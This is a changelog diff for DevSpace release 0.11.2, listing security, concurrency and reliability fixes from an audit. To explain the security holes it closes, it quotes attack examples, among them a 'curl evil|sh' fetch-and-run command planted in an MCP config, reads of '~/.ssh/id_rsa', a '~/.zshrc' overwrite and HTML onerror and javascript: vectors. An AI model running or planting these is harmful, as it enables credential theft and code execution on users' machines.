@@ -5,6 +5,111 @@ All notable changes to DevSpace are documented in this file.
 The format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/)
 and this project adheres to [Semantic Versioning](https://semver.org/).
 
+## [0.11.2] — 2026-05-13
+
+Strict 5-surface audit (security + concurrency + error-handling + renderer
++ resource/build) found 38 findings across the v0.4 → v0.11.1 surface. The
+highest-impact issues — most of them latent since early phases — are fixed
+here. 14 new regression tests; 236 vitest tests pass.
+
+### Security
+
+- **IPC `fs:*` (read, write, delete, rename, etc.) now validates every path
+  against the workspace allowlist** via a new `assertInWorkspace` util. Prior
+  to this fix, a renderer XSS or hostile markdown render could call
+  `fs.readFile('/Users/<you>/.ssh/id_rsa')` or `fs.writeFile` to anywhere on
+  disk — the IPC handlers passed `absPath` straight through. Closed the
+  entire arbitrary-file-r/w/delete surface.
+- **`settings:read` / `settings:write` now check `assertAllowedSettingsPath`**
+  — restricts to `~/.claude/**`, `<project>/.claude/**`, `<project>/.devspace/**`,
+  `<project>/.mcp.json`, `<project>/CLAUDE.md`. Stops the
+  `settings.write('~/.zshrc', payload)` escalation that previously worked.
+- **`codeflow:read-doc` was a generic file-read primitive** — now constrained
+  to paths under `<project>/.claude/codeflow/`.
+- **MCP server config writes hardened**:
+  - Re-derive target file from `scope + projectPath` instead of trusting the
+    renderer-supplied `filePath`. Closes the `mcp.create('project', '/Users/<you>',
+    'pwn', { command: '/bin/sh', args: ['-c', 'curl evil|sh'] })` path that
+    would otherwise plant `/Users/<you>/.mcp.json` so claude-from-`~`
+    auto-runs the attacker's stdio server.
+  - Per-file mutex around read-modify-write so two `saveMcpServer` IPCs
+    can't clobber each other.
+  - `__proto__` / `constructor` / `prototype` server names rejected;
+    `mcpServers` map reseated to a null-prototype object on parse.
+  - Atomic write via `atomicWriteAsync` (was `.tmp-${Date.now()}` which
+    could collide in the same millisecond and orphan tmp files in `$HOME`).
+- **Hostile-project escape via ChatTranscript hydrate** — filenames must
+  match the UUID pattern, `thread.id` must match the filename, and any
+  `activeRun.runDir` that escapes the threads dir is stripped at load.
+  Previously a single hostile `*.json` dropped in a project (via `git
+  clone` of a poisoned repo) could redirect tmux-runner writes anywhere.
+- **`tmux:send-keys` / capture / select / kill / rename now validate IDs**
+  — pane IDs must match `^%\d{1,10}$`, session names match a tight
+  alphanumeric pattern. Reject control characters in send-keys text.
+  Closes the surface where a renderer XSS could enumerate panes via
+  `listPanes()` and drive the user's Claude CLI / shell pane with
+  `send-keys` to execute arbitrary commands.
+- **Git ref + path injection guards**: `checkoutBranch` / `createBranch` /
+  `getFileDiff` / `stageFiles` / `unstageFiles` / `discardFiles` now
+  reject refs that start with `-` (flag injection) and relative paths that
+  start with `/`, `-`, or contain `..`. `getFileDiff` switched to `path.join`
+  (was template-literal string concat).
+- **`hardenGeneratedHtml` (design preview) now strips:**
+  - `on*` event-handler attributes anywhere in the document (the
+    `<img onerror="parent.postMessage(...)">` bridge-forgery vector).
+  - SVG `xlink:href="javascript:..."`.
+  - `<style>` bodies containing legacy IE `expression(` / `behavior:url(`.
+- **`lstat` instead of `stat`** in AgentsService, SkillsService,
+  CodeflowService.readDoc, DesignService.readSystemBody, SettingsService.
+  Symlinks under `<project>/.claude/agents/poisoned.md → ~/.ssh/id_rsa`
+  used to exfil through `agents.read()`; now rejected as "non-regular file".
+
+### Concurrency / lifecycle
+
+- **Workspace close now releases ephemeral resources**: new
+  `IPC.WORKSPACE_CLOSE` calls `stopDevServer` + `killProjectSessions`
+  (PTYs) + `closeWatchersForRoot` (chokidar). Wired from renderer's
+  `closeProject` so users closing a project tab no longer leave
+  Claude CLI tmux sessions, dev-server `node`/`vite` processes, and
+  chokidar watchers running until app quit.
+- **Listener leaks in subscribe paths fixed (WeakSet-guarded destroy hooks)**
+  — ChatTranscript, FileWatcher, CodeflowService were attaching a fresh
+  `wc.once('destroyed', …)` on every subscribe IPC. After ~10 mounts /
+  HMR reloads Electron threw `MaxListenersExceededWarning`; worse, in
+  FileWatcher the duplicate cleanup could close a watcher another window
+  still needed. Same pattern that DesignService / DevServerService /
+  PtyPool already used; now applied consistently.
+- **Orphan editor tabs on project close** — closing a project left
+  `design:`, `live-preview:`, `codeflow:` tabs anchored to it, still
+  firing IPC subscriptions against a workspace the user said goodbye to.
+  `closeProject` now also closes those tabs.
+- **`deleteThread` kills any in-flight run for the same thread** before
+  unlinking. Previously the tail loop kept streaming events into nowhere
+  and could crash line handlers on the deleted thread reference.
+
+### Reliability
+
+- **`gitLog` no longer returns `date: NaN`** — guards against malformed
+  dates from `simple-git` that would corrupt renderer sort order and
+  format as "Invalid Date".
+- **RouteErrorBoundary added to** `PdfPreview`, `DiffView`,
+  `MarkdownPreview`, all Settings tabs (`AccountSettings` …
+  `DesignSettings`), and the root `<App>` itself. Previously an
+  uncaught render error in any settings panel or non-design lazy view
+  blanked the entire window with no recovery path. Boundary `key={tab}`
+  ensures clicking a different settings tab clears a previous error.
+- **Settings file writes are atomic** — `writeSettingsFile` now uses
+  `atomicWriteAsync` so a crash mid-write can't truncate the user's
+  `~/.claude/settings.json`.
+
+### Notes
+
+- 14 new regression tests covering the IPC path-scope util, ChatTranscript
+  hydrate validation, and `quarantine`-on-parse-error behavior. Existing
+  hydrate tests updated to use real UUIDs (the validation is intentional).
+- No public API / IPC channel removed. `WORKSPACE_CLOSE` is new; renderer
+  store calls it via `window.devspace.workspace.close(id, path)`.
+
 ## [0.11.1] — 2026-05-13
 
 Latent-bug hunt across Phase A→C + v0.10/0.11 work. Eight findings from
